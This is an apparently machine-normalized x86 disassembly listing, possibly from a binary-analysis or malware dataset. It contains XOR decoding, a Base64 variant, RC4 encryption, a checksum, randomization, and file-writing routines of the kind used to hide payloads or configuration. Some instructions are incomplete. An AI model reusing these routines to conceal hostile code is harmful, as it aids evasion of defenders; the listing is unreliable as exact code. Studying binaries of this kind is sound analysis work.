mov esi ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
pop esi
retn
push esi
call sub_41a7eb
add esp 0x4
sub_4124d0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi [ ecx ]
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ecx + 0x4 ]
test ebx ebx
je r-xdata
push edi
lea eax [ ebx + 0x2 ]
push 0x1
push eax
call sub_41acef
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov ecx ebx
cmp ecx 0xffffffff
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov dl [ ecx ]
xor dl [ esi ]
mov eax edi
mov [ edi ] dl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov ebx [ edx + 0xc ]
mov eax edx
mov edx [ eax + 0x8 ]
mov [ ebp - 0x8 ] edx
lea esp [ esp ]
xor edx edx
mov eax ecx
div ebx
mov eax [ ebp - 0x8 ]
dec ecx
mov dl [ edx + eax ]
xor dl [ esi + ecx ]
xor dl [ esi + ecx + 0x1 ]
mov [ ecx + edi + 0x1 ] dl
cmp ecx 0xffffffff
jg r-xdata
sub_412560
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push esi
push edi
push 0x1
push eax
mov [ ebp - 0x4 ] ecx
call sub_41acef
mov esi eax
add esp 0x8
lea edi [ esi + 0x1a ]
xor ecx ecx
sub eax edi
push ebx
lea edx [ edi + ecx ]
lea ebx [ ecx + 0x41 ]
mov [ eax + edx ] bl
lea ebx [ ecx + 0x61 ]
inc ecx
mov [ edx ] bl
cmp ecx 0x1a
jl r-xdata
xor ecx ecx
pop ebx
lea ebx [ ebx ]
lea edx [ ecx + 0x30 ]
mov [ esi + ecx + 0x34 ] dl
inc ecx
cmp ecx 0xa
jl r-xdata
mov al [ ebp + 0x8 ]
cmp al [ rw-data ]
jne r-xdata
cmp al [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3e ] 0x5f2d
mov [ ecx + 0x14 ] esi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov [ esi + 0x3e ] 0x2f2b
mov [ edx + 0x10 ] esi
sub_4125e0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
lea ebx [ eax + eax + 0x8000 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
and ebx 0xffff8000
push edi
add ebx 0x8000
add eax ebx
push 0x1
push eax
xor esi esi
call sub_41acef
mov ecx [ ebp + 0x10 ]
mov edi eax
add esp 0x8
mov [ ebp - 0xc ] edi
mov [ ecx ] esi
test edi edi
jne r-xdata
mov edx [ rw-data ]
mov ecx [ ebp + 0x14 ]
push edx
lea eax [ edi + ebx ]
push ecx
push eax
mov [ ebp - 0x8 ] eax
call sub_41a0f0
mov ebx [ ebp + 0x8 ]
add esp 0xc
cmp [ ebp + 0xc ] 0x3
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0xaaaaaaab
mul [ ebp + 0xc ]
shr edx 0x1
mov [ ebp + 0x14 ] edx
lea ecx [ ecx ]
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp eax 0x1
jbe r-xdata
mov edi [ ebp + 0x10 ]
mov ebx [ edi ]
mov edi [ ebp - 0x8 ]
mov edx eax
and edx 0x3f
mov dl [ edx + edi ]
mov edi [ ebp - 0xc ]
sub ebx ecx
mov [ ebx + edi + 0x3 ] dl
mov edx 0x1
shr eax 0x6
add ecx edx
sub [ ebp + 0xc ] edx
jne r-xdata
mov eax [ ebp + 0x10 ]
sub [ ebp - 0x4 ] 0x3
add [ eax ] 0x4
sub [ ebp + 0x14 ] edx
mov ebx [ ebp + 0x8 ]
jne r-xdata
movzx eax [ esi + ebx ]
shl eax 0x10
movzx ecx [ esi + ebx ]
movzx eax [ esi + ebx + 0x1 ]
shl ecx 0x8
add eax ecx
shl eax 0x8
jmp r-xdata
movzx eax [ esi + ebx ]
movzx ecx [ esi + ebx + 0x1 ]
shl eax 0x8
xor ecx eax
movzx eax [ esi + ebx + 0x2 ]
shl ecx 0x8
xor eax ecx
add esi 0x3
xor ecx ecx
mov [ ebp + 0xc ] 0x4
mov esi [ ebp + 0x10 ]
mov esi [ esi ]
mov ebx [ ebp - 0x8 ]
mov edx eax
and edx 0x3f
mov dl [ edx + ebx ]
sub esi ecx
mov [ esi + edi + 0x3 ] dl
mov edx 0x1
shr eax 0x6
add ecx edx
sub [ ebp + 0xc ] edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ eax ]
mov cl 0x3d
mov [ esi + edi + 0x3 ] cl
cmp [ ebp - 0x4 ] edx
jne r-xdata
xor ecx ecx
mov [ ebp + 0xc ] 0x4
lea ecx [ ecx ]
add [ eax ] 0x4
mov edx [ eax ]
mov [ edx + edi + 0x2 ] cl
sub_412750
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov ecx esi
call sub_4125e0
pop esi
pop ebp
retn 0xc
movzx eax [ rw-data ]
push eax
call sub_412560
sub_412790
push ebp
mov ebp esp
push 0xffffffff
push sub_42e4f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
call sub_4124d0
mov edi eax
cmp edi ebx
jne r-xdata
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_403650
push edi
mov [ ebp - 0x4 ] ebx
call sub_41a7eb
add esp 0x4
lea eax [ ebp - 0x2c ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_403a40
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push ebx
mov ecx esi
call sub_403650
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
sub_412890
push ebp
mov ebp esp
push 0xffffffff
push sub_42e528
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x30 ] ebx
call sub_4124d0
mov edi eax
cmp edi ebx
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
lea edx [ eax + 0x1 ]
xor eax eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_4076d0
push edi
mov [ ebp - 0x4 ] ebx
call sub_41a7eb
add esp 0x4
lea eax [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] bl
call sub_4079c0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
mov ecx esi
call sub_4076d0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
sub_412980
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ rw-data ]
lea eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] al
cmp ebx ecx
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
movzx edi al
push 0x1
push edi
call sub_41acef
mov ecx [ ebp + 0x8 ]
push ebx
push ecx
push edi
push eax
mov [ esi ] eax
call sub_41ad2f
add esp 0x18
pop edi
sub_4129d0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
xor esi esi
mov [ ebp - 0x4 ] esi
cmp edx esi
jbe r-xdata
mov ax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn 0xc
mov cx [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
mov edi edi
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov bx [ ebp - 0x4 ]
shr bx 0x1
xor bx cx
movzx ebx bx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
shr al 0x1
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
shr [ ebp - 0x4 ] 0x1
mov ax [ ebp - 0x4 ]
shr ax 0x1
xor ax cx
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
shr al 0x1
xor al [ ebp - 0x4 ]
test al 0x1
je r-xdata
mov al [ esi + edi ]
mov bl al
xor bl [ ebp - 0x4 ]
test bl 0x1
je r-xdata
pop edi
pop ebx
inc esi
cmp esi edx
jb r-xdata
sub_412b20
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx ecx
movzx ecx [ ebx + 0x4 ]
mov edx [ ebx ]
push 0x4
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ecx + edx - 0x4 ]
push 0x4
push eax
call sub_41ad2f
push 0x1
push 0x100
call sub_41acef
mov ecx eax
add esp 0x18
test ecx ecx
jne r-xdata
xor eax eax
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jne r-xdata
movzx edx [ ebx + 0x4 ]
mov eax [ ebx ]
push esi
push edi
xor edi edi
xor esi esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
mov edi edi
movzx edx [ esi + ecx ]
mov [ ebp - 0x1 ] dl
xor edx edx
mov eax esi
div [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc esi
movzx edx [ edx + eax ]
mov al [ ebp - 0x1 ]
add edi edx
movzx ebx al
add edi ebx
and edi 0xff
movzx edx [ edi + ecx ]
mov [ esi + ecx - 0x1 ] dl
mov [ edi + ecx ] al
cmp esi 0x100
jne r-xdata
xor eax eax
xor esi esi
xor edi edi
cmp [ ebp + 0xc ] eax
jbe r-xdata
push ecx
call sub_41a7eb
add esp 0x4
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc esi
and esi 0xff
mov dl [ esi + ecx ]
movzx ebx dl
add eax ebx
and eax 0xff
mov bl [ eax + ecx ]
mov [ eax + ecx ] dl
mov [ esi + ecx ] bl
movzx edx [ eax + ecx ]
movzx ebx bl
add edx ebx
and edx 0x800000ff
jns r-xdata
movzx ebx [ edx + ecx ]
mov edx [ ebp + 0x8 ]
xor [ edi + edx ] bl
inc edi
cmp edi [ ebp + 0xc ]
jb r-xdata
dec edx
or edx 0xffffff00
inc edx
sub_412c20
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] 0x0
call [ GetTickCount@IAT ]
mov esi eax
call sub_41b344
add esi eax
push esi
call sub_41b332
lea eax [ ebp - 0x4 ]
push eax
call sub_41b242
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
sub esi ecx
add esp 0x8
xor edx edx
div esi
pop esi
lea eax [ ecx + edx ]
mov esp ebp
pop ebp
retn 0x8
sub_412c70
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
movzx eax [ esi ]
lea edx [ esi + 0x4 ]
push edx
push eax
call sub_4129d0
cmp [ esi + 0x2 ] ax
pop esi
sete al
pop ebp
retn 0x8
sub_412ca0
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
add edi 0x4
push 0x1
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebx ] edi
call sub_41acef
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
push edi
push esi
call sub_41ad2f
add esp 0x10
mov [ ebp + 0xc ] 0x0
call [ GetTickCount@IAT ]
mov edi eax
call sub_41b344
add edi eax
push edi
call sub_41b332
lea edx [ ebp + 0xc ]
push edx
call sub_41b242
mov ecx [ ebp + 0xc ]
mov eax ecx
xor edx edx
or edi 0xffffffff
div edi
add esp 0x8
add eax ecx
mov ecx [ ebp - 0x8 ]
push eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
sub eax 0x4
push eax
push esi
call sub_412b20
cmp al 0x1
je r-xdata
mov edx [ ebx ]
push 0x4
lea ecx [ ebp - 0x4 ]
push ecx
lea eax [ edx + esi - 0x4 ]
push 0x4
push eax
call sub_41ad2f
add esp 0x10
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push esi
call sub_41a7eb
add esp 0x4
sub_412d70
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
add esi 0xfffffffc
push 0x1
push esi
mov [ ebp - 0x4 ] ecx
mov [ eax ] esi
call sub_41acef
mov edi eax
add esp 0x8
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ esi + eax ]
push esi
push eax
push esi
push edi
call sub_41ad2f
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
add esp 0x10
push ebx
push edx
push edi
call sub_412b20
pop ebx
cmp al 0x1
je r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push edi
call sub_41a7eb
add esp 0x4
sub_412de0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push edx
push eax
call sub_41b595
add esp 0x14
pop ebp
retn
sub_412e20
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
pop esi
jmp edx
sub_412e60
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov ebx 0x8
push edi
mov edi [ ebp + 0x24 ]
cmp [ ebp + 0x1c ] ebx
jae r-xdata
push 0x0
push 0x2
push 0x4
push 0x0
push 0x2
push 0x23
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
lea eax [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] ebx
jb r-xdata
mov edx [ ebp + 0x28 ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push edi
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
pop edi
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn 0x24
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
call [ CloseHandle@IAT ]
cmp [ ebp + 0x1c ] ebx
jb r-xdata
call [ CloseHandle@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x24
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a0d6
add esp 0x4
sub_412ef0
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx ecx
mov ecx [ ebx + 0x8 ]
mov eax 0xfffffff
push edi
mov edi [ ebp + 0x8 ]
sub eax ecx
cmp eax edi
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
push r--data
call sub_4194e6
cmp edi eax
jae r-xdata
mov eax 0x8
push esi
mov esi [ ebx + 0xc ]
shr esi 0x2
lea eax [ ecx + edi ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
add eax eax
add eax eax
add esi esi
add esi esi
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
mov ecx [ ebp - 0x4 ]
sar eax 0x2
add eax eax
add eax eax
push eax
push edx
lea edx [ esi + ecx ]
push edx
mov [ ebp - 0xc ] eax
call sub_41a460
add eax [ ebp - 0xc ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
cmp [ ebp - 0x8 ] edi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov [ ebp + 0x8 ] eax
mov edi eax
lea edx [ edi * 4 ]
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call sub_41a460
mov eax [ ebx + 0x4 ]
lea ecx [ eax + edi * 4 ]
sub esi ecx
add esi eax
mov eax [ ebp - 0x4 ]
sar esi 0x2
add esi esi
add esi esi
push esi
push ecx
push eax
call sub_41a460
add esp 0x18
lea edx [ esi + eax ]
test edi edi
je r-xdata
sar esi 0x2
mov edx esi
add edx edx
add edx edx
push edx
push ecx
push eax
mov esi edi
mov [ ebp - 0xc ] edx
call sub_41a460
mov edx eax
add edx [ ebp - 0xc ]
add esp 0xc
sub esi [ ebp - 0x8 ]
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] 0x0
call sub_419f97
push r--data
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] r--data
call sub_41ac98
int3
add eax eax
add eax eax
push eax
call sub_41ac18
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
pop esi
test eax eax
je r-xdata
mov ecx edi
mov edi edx
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp + 0x8 ]
add [ ebx + 0x8 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0x4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_41a0d6
add esp 0x4
mov edi [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
[ edi ]
mov edi [ ebp + 0x8 ]
sub_413080
push ebp
mov ebp esp
push 0xffffffff
push sub_42e550
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_4030d0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_413120
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
push edi
test cl 0x3
jne r-xdata
mov ebx [ esi + 0xc ]
add ebx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov edi ebx
shr edi 0x2
cmp eax edi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ esi + 0x8 ] eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
push 0x1
mov ecx esi
call sub_412ef0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
and ebx 0x3
lea ebx [ edx + ebx * 4 ]
test ebx ebx
je r-xdata
push 0x10
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
inc [ esi + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebx ] ecx
lea edx [ ebp - 0x4 ]
push edx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_419f97
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_41ac98
int3
mov ecx [ esi + 0x4 ]
mov [ ecx + edi * 4 ] eax
sub_4131d0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_4194e6
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
cmp ecx 0x8
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_4194e6
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_401520
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea eax [ eax + edi * 2 ]
cmp eax edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
xor edx edx
mov [ eax ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
sar edx 0x1
push edx
push esi
mov ecx esi
call sub_4077d0
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
pop ebx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea ecx [ ebx + ebx ]
push ecx
push edx
mov edx [ esi + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_41a0f0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_4132f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42e58b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] ecx
xor ebx ebx
push 0xffffffff
lea ecx [ esi + 0x8 ]
mov [ esi ] eax
push ebx
lea edx [ ebp + 0x10 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] bl
call sub_4075e0
push 0xffffffff
lea ecx [ esi + 0x24 ]
push ebx
lea edx [ ebp + 0x2c ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x2
mov [ ecx ] ax
call sub_401ae0
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
cmp [ ebp + 0x40 ] 0x8
mov [ ebp + 0x24 ] 0xf
mov [ ebp + 0x20 ] ebx
mov [ ebp + 0x10 ] bl
jb r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x40
mov ecx [ ebp + 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
sub_4133c0
push esi
push edi
mov edi ecx
mov ecx 0x8
mov [ edi + 0x4c ] 0x0
cmp [ edi + 0x50 ] ecx
jb r-xdata
lea eax [ edi + 0x3c ]
mov eax [ edi + 0x3c ]
jmp r-xdata
xor ecx ecx
mov [ edi + 0x50 ] 0x7
mov [ edi + 0x4c ] 0x0
mov [ edi + 0x3c ] cx
lea ecx [ edi + 0x24 ]
call sub_410ba0
mov edx [ edi + 0x24 ]
push edx
call sub_41a0d6
add esp 0x4
mov [ edi + 0x24 ] 0x0
cmp [ edi + 0x1c ] 0x8
jb r-xdata
mov eax [ edi + 0x3c ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ eax ] dx
cmp [ edi + 0x50 ] ecx
jb r-xdata
mov [ edi + 0x1c ] 0x7
mov [ edi + 0x18 ] 0x0
xor ecx ecx
mov [ edi + 0x8 ] cx
pop edi
pop esi
retn
mov eax [ edi + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
sub_413450
push ebp
mov ebp esp
sub esp 0xc
cmp [ ecx + 0x34 ] 0x0
jne r-xdata
push esi
push edi
lea esi [ ecx + 0x24 ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_4019f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov edi [ edx + 0x8 ]
mov eax ecx
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
